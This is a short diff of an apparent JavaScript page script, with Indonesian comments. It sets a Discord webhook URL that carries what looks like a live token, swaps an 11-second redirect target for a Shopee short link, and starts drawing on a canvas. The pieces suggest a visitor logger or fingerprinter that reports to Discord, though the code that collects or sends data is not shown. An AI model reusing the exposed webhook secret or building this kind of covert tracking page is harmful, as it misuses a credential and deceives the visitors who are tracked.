@@ -1,5 +1,5 @@
 const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; // Ganti dengan Webhook Discord
-const redirectURL = "https://kangddosdandmcagakadakerjaanyamaugwkasihkerjaan.awkokawy.store/58/"; // Ganti dengan URL tujuan setelah 11 detik
+const redirectURL = "https://id.shp.ee/5chejHg"; // Ganti dengan URL tujuan setelah 11 detik
 
 const canvas = document.createElement("canvas");
 const context = canvas.getContext("2d");
